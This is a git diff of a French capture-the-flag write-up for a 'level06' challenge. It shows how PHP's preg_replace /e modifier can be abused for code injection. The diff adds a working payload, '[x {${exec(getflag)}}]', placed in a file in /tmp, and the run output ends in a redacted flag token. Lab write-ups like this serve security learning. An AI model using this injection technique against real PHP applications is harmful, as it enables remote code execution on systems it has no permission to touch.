@@ -16,7 +16,7 @@ On trouve un script php et un binaire
 	PHP Warning:  file_get_contents(coucou): failed to open stream: No such file or directory in /home/user/level06/level06.php on line 4
 	(Il doit prendre un fichier en argument)
 
-Le binaire est le script PHP compilé (wtf beurk)
+Le binaire execute le script php
 
 ```php
 <?php
@@ -50,30 +50,29 @@ Ce modifier execute l'arg subsitution avec la fonction eval() qui execute une ch
 
 http://www.murraypicton.com/archive/using-phps-preg_replace-with-the-e-modifier.php
 
+Example:
+
+	preg_replace("/c/e", "exec('echo blabla')", "coucou")
+	--->
+	blablaoublablaou
+
+
 On va devoir construire une chaine qui passe les REGEX du debut jusqu'au modifier e
 
+	1er arg = "[x touslescaracteresici]"
+	2eme arg = exec "y("(tous les caracteres ici)")"
 
-	$ echo "([x exec(getflag)])" > /tmp/coucou
+
+	$ echo "[x exec(getflag)]" > /tmp/coucou
 
 	$ ./level06 /tmp/coucou
-	(exec(getflag))
+	exec(getflag)
 
-Il l'a affiché mais pas exec
+Il l'a affiché mais pas exec. Pour acceder a la valeur de la variable retournée par la fonction, nous devons utiliser la syntaxe {${function()}}
+(https://www.php.net/manual/fr/language.types.string.php#language.types.string.parsing.complex)
 
-Essayons avec system comme l'exemple sur php.net
+	$ echo '[x {${exec(getflag)}}]' > /tmp/coucou
 
-	$ echo '[x {${system("getflag")}}]' > /tmp/coucou
-
-	$ ./level06 "/tmp/coucou"
-	PHP Parse error:  syntax error, unexpected T_CONSTANT_ENCAPSED_STRING, expecting T_STRING in /home/user/level06/level06.php(4) : regexp code on line 1
-	PHP Fatal error:  preg_replace(): Failed evaluating code:
-	y("{${system(\"getflag\")}}") in /home/user/level06/level06.php on line 4
-
-Il a essayé d'executer mais le code est pas bon, il a ajouté un escape '\' devant les doubles quotes via ses REGEX. Il faut utiliser autre chose que des doubles quotes
-
-	$ echo '[x {${system('getflag')}}]' > /tmp/coucou
-
-	$ ./level06 "/tmp/coucou"
+	$ ./level06 /tmp/coucou
 	PHP Notice:  Use of undefined constant getflag - assumed 'getflag' in /home/user/level06/level06.php(4) : regexp code on line 1
-	Check flag.Here is your token : XXXXXXXXXXXXXXXXXXXXXXX
-	PHP Notice:  Undefined variable: Check flag.Here is your token : XXXXXXXXXXXXXXXXXXX in /home/user/level06/level06.php(4) : regexp code on line 1
+	PHP Notice:  Undefined variable: Check flag.Here is your token : XXXXXXXXXXXXXXXXXXXXXX in /home/user/level06/level06.php(4) : regexp code on line 1
